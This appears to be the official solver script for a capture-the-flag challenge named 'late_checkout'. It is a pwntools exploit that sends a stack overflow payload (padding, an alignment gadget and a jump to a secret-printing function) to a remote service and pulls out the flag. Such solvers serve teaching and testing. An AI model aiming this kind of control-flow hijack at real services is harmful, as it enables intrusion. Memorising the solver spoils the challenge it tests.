#!/usr/bin/env python3
import argparse
import re

from pwn import context, flat, remote
from solve_constants import ALIGNMENT_RET, OFFSET, PRINT_RECEIPT_SECRET


FLAG_RE = re.compile(rb"(?:kctf\{flag\}|KCTF\{[0-9a-f]{64}\})")


def main() -> None:
    parser = argparse.ArgumentParser(description="late_checkout official solver")
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    context.arch = "amd64"
    context.os = "linux"
    context.log_level = "error"

    payload = flat(
        b"A" * OFFSET,
        ALIGNMENT_RET,
        PRINT_RECEIPT_SECRET,
    )

    tube = remote(args.host, args.port)
    tube.recvuntil(b"hotel:\n")
    tube.send(payload)
    tube.shutdown("send")
    output = tube.recvall(timeout=3)
    tube.close()

    match = FLAG_RE.search(output)
    if match is None:
        raise RuntimeError(f"flag not found in service output: {output!r}")
    print(match.group(0).decode())


if __name__ == "__main__":
    main()
